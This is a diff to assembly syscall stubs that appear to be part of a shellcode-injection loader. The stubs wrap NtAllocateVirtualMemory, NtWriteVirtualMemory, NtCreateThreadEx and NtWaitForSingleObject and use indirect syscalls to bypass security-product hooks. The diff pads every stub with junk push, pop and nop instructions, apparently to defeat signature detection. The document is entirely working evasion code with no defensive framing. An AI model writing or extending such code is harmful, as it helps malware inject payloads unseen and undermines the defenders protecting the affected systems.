@@ -19,25 +19,60 @@ global _stub_NtWaitForSingleObject
 
 section .text
 _stub_NtAllocateVirtualMemory:
-    mov     r10, rcx       
+    push    rcx
+    nop
+    pop     rcx
+    mov     r10, rcx
+    nop
+    push    r10
+    nop
+    pop     r10
     mov     eax, [g_SSN_NtAllocateVirtualMemory]        ; eax : SSN
+    nop
     jmp     [g_Stub_NtAllocateVirtualMemory]            ; jmp to syscall instruction
     ret
 
 _stub_NtWriteVirtualMemory:
-    mov     r10, rcx       
+    push    rcx
+    nop
+    pop     rcx
+    mov     r10, rcx
+    push    r10
+    nop
+    pop     r10
+    nop
     mov     eax, [g_SSN_NtWriteVirtualMemory]        ; eax : SSN
+    nop
+    nop
     jmp     [g_Stub_NtWriteVirtualMemory]            ; jmp to syscall instruction
     ret 
 
 _stub_NtCreateThreadEx:
-    mov     r10, rcx       
+    push    rcx
+    nop
+    pop     rcx
+    mov     r10, rcx
+    push    r10
+    nop
+    pop     r10
+    nop
     mov     eax, [g_SSN_NtCreateThreadEx]        ; eax : SSN
+    nop
     jmp     [g_Stub_NtCreateThreadEx]            ; jmp to syscall instruction
+    nop
     ret 
 
 _stub_NtWaitForSingleObject:
-    mov     r10, rcx       
+    push    rcx
+    nop
+    pop     rcx
+    mov     r10, rcx
+    nop
+    nop
+    push    r10
+    nop
+    pop     r10
+    nop
     mov     eax, [g_SSN_NtWaitForSingleObject]        ; eax : SSN
     jmp     [g_Stub_NtWaitForSingleObject]            ; jmp to syscall instruction
     ret
